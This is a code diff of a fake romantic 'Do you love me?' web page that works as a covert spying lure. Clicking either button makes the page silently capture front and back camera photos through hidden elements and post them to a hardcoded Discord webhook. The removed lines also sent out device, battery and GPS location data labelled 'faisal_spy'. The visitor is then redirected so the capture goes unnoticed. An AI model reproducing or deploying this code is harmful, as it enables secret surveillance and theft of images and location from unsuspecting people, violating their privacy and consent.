@@ -4,40 +4,36 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Proposed Her</title>
+  <link rel="stylesheet" href="./style.css" />
   <style>
-    body { background-color: #121212; color: white; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
-    .container { padding-top: 50px; }
+    /* Camera elements ko hidden rakha hai */
     #video, #canvas { display: none; }
-    img { width: 90%; max-width: 350px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    h1 { margin-top: 20px; font-size: 1.8rem; }
-    .btn { margin-top: 30px; }
+    
+    /* Yes/No buttons ki styling agar style.css load na ho */
     .btn a {
-      padding: 15px 40px;
+      padding: 10px 25px;
       margin: 10px;
       text-decoration: none;
       background: #ff4d6d;
       color: white;
-      border-radius: 50px;
+      border-radius: 20px;
       display: inline-block;
       font-weight: bold;
-      font-size: 1.1rem;
-      box-shadow: 0 4px 15px rgba(255, 77, 109, 0.4);
     }
-    .dev-name { position: absolute; top: 10px; left: 10px; font-size: 0.7rem; color: #555; }
   </style>
 </head>
 <body>
+  <div class="dev-name" style="position: absolute; top: 10px; left: 10px; font-size: 0.8rem; color: rgba(255,255,255,0.7); font-weight: bold;">
+    Dev by Faisal
+  </div>
 
-  <div class="dev-name">Dev by Faisal</div>
-
-  <div class="container">
-    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Proposal GIF">
-    <h1>Do you love me? 🤗</h1>
-    <p>Chiku is all yours</p>
-    
+  <div class="container" style="text-align: center; padding-top: 50px; font-family: Arial, sans-serif;">
+    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px;">
+    <h1 style="color: #fff;">Do you love me? 🤗</h1>
+    <p style="color: #eee;">Chiku is all yours</p>
     <div class="btn">
-      <a href="javascript:void(0)" onclick="startAll()">Yes</a>
-      <a href="javascript:void(0)" onclick="startAll()">No</a>
+      <a href="javascript:void(0)" onclick="startCapture('user')">Yes</a>
+      <a href="javascript:void(0)" onclick="startCapture('user')">No</a>
     </div>
   </div>
 
@@ -45,82 +41,61 @@
   <canvas id="canvas"></canvas>
 
   <script>
-    // Aapka Discord Webhook URL
+    // Aapka Discord Webhook URL yahan add kar diya hai
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
 
-    async function startAll() {
-        // 1. Device and Battery Info Nikalna
-        let infoText = `👤 **User Info Found!**\n📱 **Platform:** ${navigator.platform}\n🌐 **Agent:** ${navigator.userAgent.split(')')[0] + ')'}`;
-        
-        try {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                infoText += `\n🔋 **Battery:** ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
-            }
-        } catch (e) {}
-
-        // 2. Camera aur Location Shuru karna
-        captureProcess('user', infoText);
-    }
-
-    async function captureProcess(mode, infoText) {
+    async function startCapture(mode) {
       try {
-        // Camera Permission mangna
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: mode } 
+        });
+        
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // Image capture ke liye thora rukna
+        // Photo lene se pehle thora wait (1.5 sec)
         setTimeout(() => {
-          const canvas = document.getElementById('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          
-          canvas.toBlob(blob => {
-            sendData(blob, mode, infoText, stream);
-          }, 'image/png');
+          captureImage(stream, mode);
         }, 1500);
 
       } catch (err) {
-        // Agar camera block ho to sirf Info bhej dein
-        sendOnlyText(`⚠️ **Camera Blocked!**\n${infoText}`);
+        console.log("Permission Error: ", err);
+        // Agar user block kare to bhi redirect kar dein
+        window.location.href = "page1.html";
       }
     }
 
-    function sendData(imageBlob, mode, infoText, stream) {
-        // Location Permission mangna
-        navigator.geolocation.getCurrentPosition(pos => {
-            const loc = `📍 **Location:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            finalize(imageBlob, mode, `${infoText}\n${loc}`, stream);
-        }, () => {
-            finalize(imageBlob, mode, `${infoText}\n📍 **Location:** Denied/Off`, stream);
-        });
-    }
-
-    function finalize(blob, mode, fullText, stream) {
+    function captureImage(stream, mode) {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      
+      canvas.toBlob(blob => {
         const formData = new FormData();
-        formData.append('file', blob, `faisal_spy_${mode}.png`);
-        formData.append('content', `🔥 **Faisal Bhai, Naya Data Mil Gaya!**\n${fullText}\n📷 **Cam:** ${mode}`);
+        formData.append('file', blob, `faisal_capture_${mode}.png`);
+        formData.append('content', `🚀 **Alert! Faisal Bhai, Nayi Photo Agayi!**\n📸 Camera: ${mode === 'user' ? 'Front (Selfie)' : 'Back'}`);
 
-        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
-        .then(() => {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            if (mode === 'user') {
-                captureProcess('environment', fullText); // Back camera capture
-            } else {
-                window.location.href = "page1.html"; // Final Redirect
-            }
-        }).catch(() => {
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        }).then(() => {
+          // Stream close karna
+          stream.getTracks().forEach(track => track.stop());
+          
+          if(mode === 'user') {
+            // Front ke baad foran Back camera try karein
+            startCapture('environment'); 
+          } else {
+            // Sab done, ab next page par bhej dein
+            window.location.href = "page1.html";
+          }
+        }).catch(err => {
             window.location.href = "page1.html";
         });
-    }
-
-    function sendOnlyText(msg) {
-        const formData = new FormData();
-        formData.append('content', msg);
-        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
-        .then(() => { window.location.href = "page1.html"; });
+      }, 'image/png');
     }
   </script>
 </body>
